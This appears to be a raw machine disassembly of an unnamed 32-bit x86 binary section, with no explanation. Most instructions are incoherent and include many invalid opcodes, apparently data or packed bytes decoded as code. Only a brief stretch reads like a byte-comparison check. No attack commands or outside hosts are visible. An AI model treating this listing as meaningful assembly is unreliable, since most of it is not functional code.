  410b09:	or     ebx,DWORD PTR [esi+0x58]
  410b0c:	call   0xc509d350
  410b11:	leave  
  410b12:	xor    eax,0x6f5a967b
  410b17:	xlat   BYTE PTR ds:[ebx]
  410b18:	xchg   ebp,eax
  410b19:	sbb    DWORD PTR [ebp+ebx*2-0x31],ebx
  410b1d:	scas   eax,DWORD PTR es:[edi]
  410b1e:	mov    dh,0xe
  410b20:	in     al,dx
  410b21:	test   BYTE PTR [eax+0x44],dl
  410b24:	outs   dx,DWORD PTR ds:[esi]
  410b25:	mov    edx,0xb17bc390
  410b2a:	test   eax,0xcac29ce
  410b2f:	mov    edx,0x54b8355d
  410b34:	fldcw  WORD PTR [ecx+0x5d677706]
  410b3a:	dec    ecx
  410b3b:	lahf   
  410b3c:	mov    ch,0xc4
  410b3e:	outs   dx,BYTE PTR ds:[esi]
  410b3f:	popf   
  410b40:	mov    al,ds:0xdb31000b
  410b45:	pop    eax
  410b46:	xchg   ebp,eax
  410b47:	ret    0xe1bf
  410b4a:	test   BYTE PTR [edx-0x24a51d75],ch
  410b50:	xor    BYTE PTR [edi-0x2d],0x1c
  410b54:	inc    edi
  410b55:	loope  0x410bbc
  410b57:	(bad)  
  410b58:	hlt    
  410b59:	sub    al,0xa4
  410b5b:	mov    esp,0x81b5dfa7
  410b60:	jle    0x410b9d
  410b62:	jle    0x410b42
  410b64:	sbb    esi,0x81fa4259
  410b6a:	loopne 0x410b18
  410b6c:	rol    BYTE PTR [edi],1
  410b6e:	mov    bh,0x53
  410b70:	pop    ebx
  410b71:	or     DWORD PTR ds:0xd1a4a5c3,0x6821d0fc
  410b7b:	push   edi
  410b7c:	int    0xaf
  410b7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b7f:	add    DWORD PTR [ebx+ebx*1+0x136f0760],eax
  410b86:	scas   al,BYTE PTR es:[edi]
  410b87:	cmp    BYTE PTR [edi-0x2a7cb8f6],ah
  410b8d:	(bad)  
  410b8e:	shl    BYTE PTR [ebp+0x7a],0x1a
  410b92:	mov    esi,0x6f8ab505
  410b97:	sbb    BYTE PTR [edi+0x51],ch
  410b9a:	int    0xb8
  410b9c:	cdq    
  410b9d:	pop    ecx
  410b9e:	das    
  410b9f:	dec    esp
  410ba0:	mov    bh,0x94
  410ba2:	pop    ecx
  410ba3:	xor    al,0x75
  410ba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ba7:	mov    cl,0x1d
  410ba9:	div    esp
  410bab:	xchg   ecx,eax
  410bac:	pop    esp
  410bad:	or     BYTE PTR [esi+eax*2-0x6e4dfa1a],cl
  410bb4:	lock pop ds
  410bb6:	into   
  410bb7:	push   eax
  410bb8:	mov    edi,0x7909ba29
  410bbd:	xchg   ebx,eax
  410bbe:	inc    eax
  410bbf:	lock pop ebx
  410bc1:	xor    ah,BYTE PTR [ebp+0x598c91e]
  410bc7:	push   ds
  410bc8:	and    bh,ah
  410bca:	gs inc eax
  410bcc:	xor    ecx,DWORD PTR [ecx-0x10102db2]
  410bd2:	ins    DWORD PTR es:[edi],dx
  410bd3:	sti    
  410bd4:	dec    eax
  410bd5:	(bad)  
  410bd6:	ror    DWORD PTR [esi+ecx*4-0xd],1
  410bda:	push   ss
  410bdb:	mov    BYTE PTR [edi],bl
  410bdd:	fst    DWORD PTR [ecx+0x17]
  410be0:	mov    bh,0xc3
  410be2:	xchg   edi,eax
  410be3:	ret    
  410be4:	leave  
  410be5:	sbb    eax,0xb0aeba66
  410bea:	ror    DWORD PTR [ecx],0xb4
  410bed:	bound  ebp,QWORD PTR [ebp-0x5730a76d]
  410bf3:	ins    DWORD PTR es:[edi],dx
  410bf4:	jl     0x410c56
  410bf6:	mov    edx,0xe66ea27c
  410bfb:	out    dx,eax
  410bfc:	sub    ebx,DWORD PTR [eax-0x774050b2]
  410c02:	xchg   ebp,eax
  410c03:	lock jb 0x410c04
  410c06:	pop    esp
  410c07:	pushf  
  410c08:	cmp    al,0x4d
  410c0a:	out    0x85,eax
  410c0c:	lods   eax,DWORD PTR ds:[esi]
  410c0d:	push   edx
  410c0e:	mov    edi,DWORD PTR [ebp-0x3c]
  410c11:	je     0x410bee
  410c13:	iret   
  410c14:	add    al,0xc
  410c16:	jns    0x410ba0
  410c18:	sub    ebp,DWORD PTR [ebp+0x25]
  410c1b:	pop    edi
  410c1c:	pop    es
  410c1d:	jge    0x410c5e
  410c1f:	dec    ebx
  410c20:	imul   edx,DWORD PTR [edx-0x31b5471a],0x8a6633c
  410c2a:	jae    0x410c92
  410c2c:	or     esp,esi
  410c2e:	bound  esp,QWORD PTR [ebx+0x5796fe63]
  410c34:	leave  
  410c35:	or     BYTE PTR [edi],dl
  410c37:	and    ah,BYTE PTR [ebx-0x2e]
  410c3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c3b:	aas    
  410c3c:	mov    ds:0x981e375c,al
  410c41:	sar    DWORD PTR [eax],cl
  410c43:	sbb    ah,dh
  410c45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c46:	(bad)  
  410c47:	pop    ecx
  410c48:	jge    0x410c96
  410c4a:	push   ebp
  410c4b:	fisttp WORD PTR [ecx]
  410c4d:	aam    0xd2
  410c4f:	loope  0x410cab
  410c51:	cmp    BYTE PTR [ecx],0x72
  410c54:	cdq    
  410c55:	inc    ebx
  410c56:	dec    ebx
  410c57:	inc    esi
  410c58:	jns    0x410c9d
  410c5a:	adc    al,0x1
  410c5c:	push   0xd
  410c5e:	add    DWORD PTR [edx+0x62],0x285c94c
  410c65:	rcl    DWORD PTR [edx+0x70bcddcf],1
  410c6b:	mov    esi,0xaaedbd79
  410c70:	pop    edx
  410c71:	pop    edi
  410c72:	dec    ecx
  410c73:	out    dx,eax
  410c74:	int3   
  410c75:	mov    ds:0xfbed24e9,eax
  410c7a:	rcr    DWORD PTR [esi+0x540ff731],cl
  410c80:	adc    eax,0x4c270e5
  410c85:	mov    eax,0x403cbb43
  410c8a:	out    dx,al
  410c8b:	repnz dec esi
  410c8d:	mov    eax,ds:0x66d0b262
  410c92:	lea    esp,[ebx]
  410c94:	pop    edx
  410c95:	jecxz  0x410c27
  410c97:	out    0x25,al
  410c99:	and    edi,DWORD PTR [edx-0x18932297]
  410c9f:	add    edi,DWORD PTR [esi-0x53]
  410ca2:	stos   DWORD PTR es:[edi],eax
  410ca3:	push   edi
  410ca4:	dec    esi
  410ca5:	push   edi
  410ca6:	push   cs
  410ca7:	xchg   BYTE PTR [esi+0x78cbd0df],bl
  410cad:	sti    
  410cae:	cs jb  0x410ca8
  410cb1:	call   0x9a1b:0x5957dda2
  410cb8:	loop   0x410c8f
  410cba:	jne    0x410cd3
  410cbc:	fistp  QWORD PTR [eax]
  410cbe:	es xchg ebp,eax
  410cc0:	sub    ebp,DWORD PTR [eax+0x1f]
  410cc3:	jae    0x410cfe
  410cc5:	dec    esi
  410cc6:	and    eax,esi
  410cc8:	sahf   
  410cc9:	je     0x410c7b
  410ccb:	and    esp,DWORD PTR [ecx]
  410ccd:	dec    ebp
  410cce:	jmp    0x213cf48f
  410cd3:	add    ecx,ebp
  410cd5:	jo     0x410cc4
  410cd7:	rcr    ecx,cl
  410cd9:	rcr    BYTE PTR [edx+0x31e57361],0x7d
  410ce0:	fistp  WORD PTR [edi+0x42261405]
  410ce6:	rcr    ebx,1
  410ce8:	fild   DWORD PTR [ecx]
  410cea:	ins    DWORD PTR es:[edi],dx
  410ceb:	mov    ebp,0x7bc1166
  410cf0:	add    al,0xd0
  410cf2:	pop    edi
  410cf3:	mov    ecx,0x1b98fdcd
  410cf8:	mov    ebp,0x54005275
  410cfd:	test   eax,0x13b83fbc
  410d02:	pusha  
  410d03:	out    0xd8,eax
  410d05:	out    dx,eax
  410d06:	iret   
  410d07:	or     al,0xac
  410d09:	movsx  edi,WORD PTR [ecx-0x77]
  410d0d:	add    cl,BYTE PTR [ebx-0x361607bb]
  410d13:	add    al,BYTE PTR [eax]
  410d15:	add    BYTE PTR [eax+ebp*1-0x2a],dh
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x7bcf099c
  410d25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d26:	jmp    0x410ce0
  410d28:	jle    0x410da8
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410cd8
  410d2f:	test   ebp,esi
  410d31:	adc    DWORD PTR [eax+0x67],ebx
  410d34:	fwait
  410d35:	or     al,cl
  410d37:	or     DWORD PTR [ebp+0x5b22e619],edi
  410d3d:	xor    ch,dl
  410d3f:	xchg   ebx,eax
  410d40:	inc    ecx
  410d41:	xlat   BYTE PTR ds:[ebx]
  410d42:	adc    DWORD PTR [eax+esi*2-0x6c1f2ea9],esi
  410d49:	xor    edx,esi
  410d4b:	fwait
  410d4c:	adc    eax,0xd3ebe019
  410d51:	adc    BYTE PTR [ebp-0x9],al
  410d54:	cdq    
  410d55:	cli    
  410d56:	(bad)  
  410d57:	xor    DWORD PTR [esi],ebp
  410d59:	sub    dl,bh
  410d5b:	jno    0x410d8d
  410d5d:	mov    bl,0x9e
  410d5f:	adc    BYTE PTR [esi+0x1027c350],ch
  410d65:	inc    DWORD PTR [eax]
  410d67:	mov    ah,0x51
  410d69:	inc    edx
  410d6a:	mov    ebx,0x58623384
  410d6f:	adc    dh,dl
  410d71:	fs add eax,0x8a4c8ad
  410d77:	sub    bl,BYTE PTR [ecx+esi*2+0x2faddb99]
  410d7e:	cmp    esi,DWORD PTR [esi]
  410d80:	and    BYTE PTR [esi-0x6a],dl
  410d83:	and    DWORD PTR [ecx+edx*8-0x7a],ebx
  410d87:	test   al,0x78
  410d89:	cmp    ch,ch
  410d8b:	scas   eax,DWORD PTR es:[edi]
  410d8c:	xchg   ecx,eax
  410d8d:	jns    0x410d66
  410d8f:	jg     0x410d48
  410d91:	mov    ecx,0xcdfe716
  410d96:	adc    bh,BYTE PTR [edx+0xb3f2952]
  410d9c:	mov    ds:0x13e0d71d,al
  410da1:	call   0xb8ff:0x7e254ff6
  410da8:	lods   eax,DWORD PTR ds:[esi]
  410da9:	pop    edi
  410daa:	push   cs
  410dab:	test   DWORD PTR [ebx+edi*8+0x4f],esi
  410daf:	into   
  410db0:	pop    ss
  410db1:	fld    DWORD PTR [esi+0x6c]
  410db4:	loope  0x410dfd
  410db6:	dec    edi
  410db7:	imul   ebx,DWORD PTR [ebx-0x1d94c4b3],0x3a
  410dbe:	push   0xffffffa8
  410dc0:	repz xchg edx,eax
  410dc2:	sbb    DWORD PTR [edi+0x51],edx
  410dc5:	mov    ebx,0x761f81c
  410dca:	dec    eax
  410dcb:	jmp    0x5c291ef7
  410dd0:	stos   BYTE PTR es:[edi],al
  410dd1:	fcmove st,st(5)
  410dd3:	or     ecx,DWORD PTR [esi]
  410dd5:	pop    ecx
  410dd6:	jnp    0x410dba
  410dd8:	or     dl,BYTE PTR [ebx+0x3c]
  410ddb:	gs fcom st(5)
  410dde:	mov    esi,0xa215726f
  410de3:	fstp   st(4)
  410de5:	outs   dx,DWORD PTR ds:[esi]
  410de6:	sbb    esi,DWORD PTR [edx]
  410de8:	fild   WORD PTR [edi+ebp*1-0x2ae5500]
  410def:	sub    DWORD PTR [ecx-0x3d],edx
  410df2:	ins    DWORD PTR es:[edi],dx
  410df3:	push   ebp
  410df4:	ret    
  410df5:	hlt    
  410df6:	xchg   ebp,eax
  410df7:	pop    ecx
  410df8:	outs   dx,DWORD PTR ds:[esi]
  410df9:	out    dx,eax
  410dfa:	mov    eax,0x9810f7c
  410dff:	mov    bh,BYTE PTR [edi]
  410e01:	gs xor esp,esp
  410e04:	and    bh,BYTE PTR [esi]
  410e06:	pop    ecx
  410e07:	sbb    eax,DWORD PTR [eax]
  410e09:	push   0x85b6cd9
  410e0e:	xchg   edi,eax
  410e0f:	popa   
  410e10:	sahf   
  410e11:	adc    BYTE PTR [edx],0xcd
  410e14:	sbb    DWORD PTR [ebx],0x13
  410e17:	call   0xbb492d92
  410e1c:	leave  
  410e1d:	pop    ecx
  410e1e:	test   eax,0xd90f5267
  410e23:	aas    
  410e24:	mov    ebp,0xd2b9b2b1
  410e29:	dec    ecx
  410e2a:	je     0x410ea6
  410e2c:	xor    BYTE PTR [eax+0x32],ah
  410e2f:	push   DWORD PTR [edi-0x58b8eb11]
  410e35:	inc    eax
  410e36:	leave  
  410e37:	jo     0x410e8a
  410e39:	mov    edx,0x2dbd52c9
  410e3e:	int    0xf5
  410e40:	sub    al,0x50
  410e42:	jmp    0x410e34
  410e44:	and    BYTE PTR [edx+eax*4-0x73fe9ceb],ch
  410e4b:	aaa    
  410e4c:	(bad)  
  410e4d:	fwait
  410e4e:	lock icebp 
  410e50:	jl     0x410dde
  410e52:	mov    ebp,0x9fe9a734
  410e57:	fld    QWORD PTR [esi+0x78]
  410e5a:	adc    al,BYTE PTR [eax+0x73]
  410e5d:	push   ecx
  410e5e:	(bad)  
  410e5f:	idiv   DWORD PTR [esp+esi*8]
  410e62:	call   0x3b49a568
  410e67:	cld    
  410e68:	into   
  410e69:	add    DWORD PTR [edx-0x34],ebp
  410e6c:	pop    esp
  410e6d:	xchg   esp,eax
  410e6e:	lahf   
  410e6f:	lock adc esi,DWORD PTR [ebx+edi*2]
  410e73:	jno    0x410e98
  410e75:	cmp    al,0x21
  410e77:	adc    al,0x2a
  410e79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e7a:	ins    BYTE PTR es:[edi],dx
  410e7b:	mov    edi,0xfe508e7a
  410e80:	int    0x92
  410e82:	sub    al,0xdf
  410e84:	xchg   ebp,eax
  410e85:	lods   al,BYTE PTR ds:[esi]
  410e86:	push   0x12d4d242
  410e8b:	adc    dh,BYTE PTR [edi-0x2abdfc86]
  410e91:	mov    esi,0x74b5d6d5
  410e96:	jg     0x410e74
  410e98:	out    0x76,al
  410e9a:	mov    esp,0xbef8226a
  410e9f:	repz scas eax,DWORD PTR es:[edi]
  410ea1:	lahf   
  410ea2:	xor    eax,0xdcb01bd5
  410ea7:	repz push edx
  410ea9:	in     al,0x9c
  410eab:	pop    es
  410eac:	pop    ds
  410ead:	adc    al,0xa6
  410eaf:	(bad)  
  410eb0:	add    BYTE PTR [ebp+0x7f901d6],dl
  410eb6:	xchg   edx,eax
  410eb7:	jo     0x410f26
  410eb9:	xor    ch,BYTE PTR ds:0xa6a5ed09
  410ebf:	xor    bl,BYTE PTR [ebx]
  410ec1:	out    dx,eax
  410ec2:	and    eax,0xfd5d1324
  410ec7:	out    dx,al
  410ec8:	(bad)  
  410ec9:	mov    ebx,ebp
  410ecb:	cmp    eax,eax
  410ecd:	adc    bl,cl
  410ecf:	sbb    ebp,esp
  410ed1:	ret    0x6096
  410ed4:	in     eax,0x45
  410ed6:	and    BYTE PTR [esi],bl
  410ed8:	out    dx,eax
  410ed9:	jmp    0x9018:0xa099c0dd
  410ee0:	addr16 push 0x8cec7690
  410ee6:	retf   
  410ee7:	jge    0x410f33
  410ee9:	and    BYTE PTR [eax+0x5e],ah
  410eec:	mov    dl,0x2a
  410eee:	dec    esp
  410eef:	(bad)  
  410ef0:	jp     0x410e74
  410ef2:	sub    al,0x7b
  410ef4:	fild   QWORD PTR [edi-0x3414b135]
  410efa:	mov    edi,0xa46c70da
  410eff:	sbb    BYTE PTR [edx],bl
  410f01:	push   ss
  410f02:	(bad)  
  410f03:	and    eax,DWORD PTR [edx+0x49]
  410f06:	push   edi
  410f07:	fsub   DWORD PTR [ecx-0x49]
  410f0a:	push   eax
  410f0b:	jle    0x410f11
  410f0d:	mov    ebx,DWORD PTR [edi+esi*8]
  410f10:	cmp    eax,0x2287b208
  410f15:	mov    BYTE PTR [ebx],al
  410f17:	jnp    0x410f79
  410f19:	cwde   
  410f1a:	sbb    edi,ecx
  410f1c:	adc    DWORD PTR [eax+0x68],esp
  410f1f:	(bad)
  410f23:	fimul  WORD PTR [esi-0x6235263f]
  410f29:	mov    eax,ds:0x38b10e54
  410f2e:	add    BYTE PTR [esi+0xd9f593e],bh
  410f34:	xor    edi,DWORD PTR fs:[ebx-0xbc1b0d3]
  410f3b:	ins    BYTE PTR es:[edi],dx
  410f3c:	xor    DWORD PTR [eax],edi
  410f3e:	sbb    eax,0xd5ba73e
  410f43:	and    bl,bl
  410f45:	mov    WORD PTR [ebp-0x36f24254],gs
  410f4b:	jae    0x410f6e
  410f4d:	ss push 0x30
  410f50:	inc    edx
  410f51:	call   0x27c06663
  410f56:	fild   WORD PTR [ebx+0x36f7954f]
  410f5c:	icebp  
  410f5d:	imul   DWORD PTR [edi+0x1a97693]
  410f63:	fsub   QWORD PTR [eax+eiz*8-0x5f37b0e8]
  410f6a:	int3   
  410f6b:	pop    edi
  410f6c:	sub    ecx,DWORD PTR [ebx-0xd]
  410f6f:	test   eax,0x74a20caf
  410f74:	jge    0x410efd
  410f76:	mov    ch,0x6e
  410f78:	mov    ebx,0xfaaba244
  410f7d:	test   BYTE PTR [ebx+0x2d4ac124],ah
  410f83:	addr16 jo 0x410f5b
  410f86:	add    BYTE PTR ds:0xcff28fe2,dh
  410f8c:	adc    eax,0xa322a151
  410f91:	pop    ebx
  410f92:	clc    
  410f93:	jne    0x410f6a
  410f95:	mov    esi,0x4b48f2c2
  410f9a:	cli    
  410f9b:	daa    
  410f9c:	cmp    cl,BYTE PTR [ebx]
  410f9e:	cld    
  410f9f:	add    dh,dl
  410fa1:	and    DWORD PTR [ebp-0x166e2bfa],0xffffffeb
  410fa8:	js     0x411027
  410faa:	jbe    0x410f3a
  410fac:	add    dl,ah
  410fae:	mov    es,WORD PTR [eax+0x61310726]
  410fb4:	mov    BYTE PTR [ebp-0x2854401],dl
  410fba:	mov    esp,cs
  410fbc:	push   edi
  410fbd:	loop   0x410fa3
  410fbf:	ds out dx,eax
  410fc1:	fimul  DWORD PTR [eax-0x2d]
  410fc4:	ss pop esi
  410fc6:	push   cs
  410fc7:	xor    DWORD PTR [ebp+0x6e],ecx
  410fca:	pop    ss
  410fcb:	xor    DWORD PTR [eax+0x1124a0b5],0x56
  410fd2:	arpl   WORD PTR [edx],si
  410fd4:	rcr    BYTE PTR [esi-0x47],cl
  410fd7:	lods   al,BYTE PTR ds:[esi]
  410fd8:	pop    edi
  410fd9:	xor    eax,esp
  410fdb:	daa    
  410fdc:	mov    cl,0x94
  410fde:	fbstp  TBYTE PTR [ebx]
  410fe0:	rol    DWORD PTR [ebx],0xc6
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x410fc3
  41102b:	xchg   ebx,eax
  41102c:	push   esp
  41102d:	in     eax,0x18
  41102f:	inc    edi
  411030:	jle    0x4110b0
  411032:	scas   eax,DWORD PTR es:[edi]
  411033:	jl     0x4110b3
  411035:	jle    0x41105a
  411037:	and    ebx,DWORD PTR [esp]
  41103a:	inc    edi
  41103b:	inc    ecx
  41103c:	(bad)  
  41103d:	and    al,0xd4
  41103f:	dec    edx
  411040:	das    
  411041:	iret   
  411042:	pop    ss
  411043:	addr16 daa 
  411045:	addr16 out dx,al
  411047:	cmc    
  411048:	adc    BYTE PTR [eax],al
  41104a:	std    
  41104b:	or     esp,esi
  41104d:	je     0x410fcf
  41104f:	(bad)  
  411050:	jns    0x411063
  411052:	test   BYTE PTR [edi-0x70],0xd9
  411056:	cmp    BYTE PTR [edi+0xe],cl
  411059:	lahf   
  41105a:	out    dx,eax
  41105b:	push   esp
  41105c:	push   es
  41105d:	(bad)  
  41105e:	jmp    0x4110a6
  411060:	mov    eax,ds:0x45927b8d
  411065:	test   DWORD PTR [ecx],0x84c53685
  41106b:	mov    edi,0x226ff71c
  411070:	shl    DWORD PTR [ebx+0x36],0x15
  411074:	pop    esi
  411075:	inc    ebp
  411076:	sub    DWORD PTR [esi+0x3d],eax
  411079:	enter  0x41a5,0xee
  41107d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41107e:	inc    ecx
  41107f:	push   0x45
  411081:	sbb    eax,0x731d1e2f
  411086:	sahf   
  411087:	adc    DWORD PTR [esi+0x2],0xfffffff2
  41108b:	int    0x23
  41108d:	int3   
  41108e:	cli    
  41108f:	retf   0xcd47
  411092:	sub    DWORD PTR [ecx-0x3c],esp
  411095:	mov    al,ds:0x627e579d
  41109a:	cld    
  41109b:	retf   
  41109c:	je     0x4110be
  41109e:	inc    esp
  41109f:	out    0x98,eax
  4110a1:	adc    BYTE PTR [ebx],0xd
  4110a4:	rol    BYTE PTR [eax+0x3e61a670],cl
  4110aa:	pop    ebp
  4110ab:	loopne 0x4110b3
  4110ad:	es sbb eax,0x36273714
  4110b3:	or     al,0xb
  4110b5:	sbb    eax,0xc41f6ef3
  4110ba:	and    eax,0xd72a87a4
  4110bf:	lds    eax,FWORD PTR [edi-0x16]
  4110c2:	jp     0x4110c7
  4110c4:	nop
  4110c5:	add    ah,0xf4
  4110c8:	dec    esp
  4110c9:	ret    
  4110ca:	aaa    
  4110cb:	loopne 0x41108a
  4110cd:	xchg   ebp,eax
  4110ce:	push   0x4a
  4110d0:	retf   
  4110d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110d2:	mov    eax,ds:0x745df54e
  4110d7:	fadd   st,st(2)
  4110d9:	add    DWORD PTR [esi+0x710771bf],ebp
  4110df:	out    0x38,eax
  4110e1:	ret    
  4110e2:	lock repz leave 
  4110e5:	lahf   
  4110e6:	nop
  4110e7:	cmp    DWORD PTR [ecx],0xffffffbe
  4110ea:	dec    edi
  4110eb:	sti    
  4110ec:	fsub   QWORD PTR [ebx-0x46]
  4110ef:	cmp    ch,BYTE PTR [ebx+0x794413ac]
  4110f5:	mov    esi,0x4c83425e
  4110fa:	cdq    
  4110fb:	sbb    eax,0xe89d4fbc
  411100:	js     0x4110af
  411102:	inc    edi
  411103:	inc    edi
  411104:	mov    cl,0x26
  411106:	push   edi
  411107:	cmp    DWORD PTR [esp+esi*4+0x1d],ebx
  41110b:	retf   
  41110c:	mov    dl,0x99
  41110e:	gs jae 0x4110f7
  411111:	dec    eax
  411112:	mov    bh,0xf4
  411114:	outs   dx,DWORD PTR ds:[esi]
  411115:	aaa    
  411116:	fisubr DWORD PTR [edx]
  411118:	xchg   ebx,edi
  41111a:	adc    BYTE PTR [edx],cl
  41111c:	jns    0x41114f
  41111e:	das    
  41111f:	mov    edi,0x98f9889d
  411124:	jmp    FWORD PTR [ebp-0x5552413c]
  41112a:	jne    0x4110c8
  41112c:	imul   esi,ebx,0x68
  41112f:	int3   
  411130:	inc    ecx
  411131:	cs jne 0x411182
  411134:	fsub   QWORD PTR [esi-0x365933d3]
  41113a:	add    BYTE PTR [ecx],ah
  41113c:	sub    dh,BYTE PTR [esi]
  41113e:	sbb    BYTE PTR [ecx-0x354e8d1b],0x76
  411145:	dec    ebx
  411146:	xor    dh,BYTE PTR [ebp+0x5a]
  411149:	call   0x34a5:0xbd038b97
  411150:	idiv   al
  411152:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411153:	cmp    al,0xe
  411155:	stos   DWORD PTR es:[edi],eax
  411156:	ret    0x2623
  411159:	sti    
  41115a:	push   esi
  41115b:	push   edi
  41115c:	jb     0x4110e5
  41115e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41115f:	push   ds
  411160:	stc    
  411161:	in     eax,dx
  411162:	out    dx,eax
  411163:	mov    edi,0x8c4b5693
  411168:	mov    fs,WORD PTR [edx]
  41116a:	addr16 addr16 out dx,al
  41116d:	retf   0x2e1
  411170:	sbb    ecx,0x39b43aa6
  411176:	dec    esi
  411177:	std    
  411178:	inc    edi
  411179:	and    ebx,DWORD PTR [esi+0x20]
  41117c:	arpl   WORD PTR [ecx],si
  41117e:	and    bh,BYTE PTR [edx-0x6cca419b]
  411184:	cmp    esi,DWORD PTR [ebx-0x4]
  411187:	outs   dx,DWORD PTR ds:[esi]
  411188:	xchg   esp,eax
  411189:	xchg   esp,eax
  41118a:	test   esi,eax
  41118c:	outs   dx,DWORD PTR ds:[esi]
  41118d:	sbb    eax,0x640549a5
  411192:	pop    edx
  411193:	retf   
  411194:	iret   
  411195:	(bad)  
  411196:	pop    ebp
  411197:	mov    dl,0xb1
  411199:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41119a:	and    ebp,DWORD PTR [edx+esi*1]
  41119d:	mov    ds:0xeb3a2de6,eax
  4111a2:	cmp    esi,edi
  4111a4:	repnz mov ds:0x8a06053,al
  4111aa:	fldcw  WORD PTR [esi+0x1d35ddbf]
  4111b0:	xor    DWORD PTR [eax-0x66],esp
  4111b3:	jbe    0x411187
  4111b5:	push   esp
  4111b6:	adc    BYTE PTR [ebx+0x23a8286d],al
  4111bc:	rcl    DWORD PTR [esi],cl
  4111be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111bf:	call   0xc54357c7
  4111c4:	xchg   esi,eax
  4111c5:	enter  0x462,0x7d
  4111c9:	sub    eax,0x873fe271
  4111ce:	mov    al,ds:0x680c38b5
  4111d3:	mov    ecx,0xec649276
  4111d8:	xor    al,0xe5
  4111da:	lds    ebp,FWORD PTR [edx+0x52]
  4111dd:	int3   
  4111de:	shl    ecx,0x9c
  4111e1:	daa    
  4111e2:	(bad)
  4111e5:	adc    ecx,DWORD PTR [eax-0x299ae04c]
  4111eb:	sbb    al,0x3a
  4111ed:	lahf   
  4111ee:	lods   al,BYTE PTR ds:[esi]
  4111ef:	es pop esi
  4111f1:	stos   BYTE PTR es:[edi],al
  4111f2:	mov    eax,ds:0xe8cb1532
  4111f7:	sbb    eax,0x50b0385
  4111fc:	dec    ecx
  4111fd:	push   cs
  4111fe:	pop    esp
  4111ff:	mov    ah,0x25
  411201:	push   ebp
  411202:	cdq    
  411203:	xchg   ecx,eax
  411204:	sub    al,0x8a
  411206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411207:	pop    ebp
  411208:	jmp    0x49abe7
  41120d:	jge    0x411245
  41120f:	or     al,0xb5
  411211:	pushf  
  411212:	xchg   ebp,eax
  411213:	inc    edx
  411214:	sar    BYTE PTR [eax-0x37],0xb8
  411218:	in     eax,dx
  411219:	cmp    BYTE PTR [ecx+0x3],0xb0
  41121d:	out    0x8a,al
  41121f:	mov    ah,0x4e
  411221:	xor    bl,BYTE PTR [eax-0x150235fa]
  411227:	cs xchg edx,eax
  411229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41122a:	pop    esi
  41122b:	lea    esi,[ebp+ebx*4+0x58]
  41122f:	inc    eax
  411230:	adc    eax,0x485652b
  411235:	sbb    eax,0x4bf9a61c
  41123a:	push   ebx
  41123b:	imul   esi,DWORD PTR [ecx+0x15],0x9807bb16
  411242:	cmp    ebx,DWORD PTR [ecx]
  411244:	lods   eax,DWORD PTR ds:[esi]
  411245:	mov    cl,dl
  411247:	popf   
  411248:	mov    ds:0xf4221f54,eax
  41124d:	jno    0x41125f
  41124f:	adc    ebx,DWORD PTR [eax]
  411251:	fisttp QWORD PTR [edx-0x22]
  411254:	mov    dl,0x82
  411256:	mov    bl,0xb5
  411258:	add    BYTE PTR [esi],bh
  41125a:	aam    0x6c
  41125c:	(bad)  
  41125d:	sbb    eax,0xd1128044
  411262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411263:	mov    BYTE PTR [edi],cl
  411265:	aas    
  411266:	push   ebp
  411267:	push   eax
  411268:	xchg   edi,eax
  411269:	cmp    ebp,DWORD PTR [ecx]
  41126b:	add    eax,0x890b129c
  411270:	in     al,dx
  411271:	cmp    al,0x52
  411273:	test   eax,0x72177dc3
  411278:	ret    
  411279:	sub    al,0x95
  41127b:	je     0x41125f
  41127d:	outs   dx,BYTE PTR ds:[esi]
  41127e:	sahf   
  41127f:	jns    0x4112bc
  411281:	test   DWORD PTR [edi],esp
  411283:	test   BYTE PTR [ebx-0x2],0xf0
  411287:	cmp    bl,0x9d
  41128a:	pop    edi
  41128b:	or     BYTE PTR [ebx-0x78318232],bh
  411291:	xor    al,0xa1
  411293:	bound  edx,QWORD PTR [eax+0x26]
  411296:	xchg   esi,eax
  411297:	adc    esp,DWORD PTR [edi+0x73471cae]
  41129d:	push   esi
  41129e:	mov    cl,0xb2
  4112a0:	and    al,0x62
  4112a2:	lods   al,BYTE PTR ds:[esi]
  4112a4:	inc    esi
  4112a5:	inc    ecx
  4112a6:	sub    BYTE PTR [edi+0x33],bh
  4112a9:	ss mov ch,0xfe
  4112ac:	xor    dh,BYTE PTR [ecx]
  4112ae:	out    0xda,eax
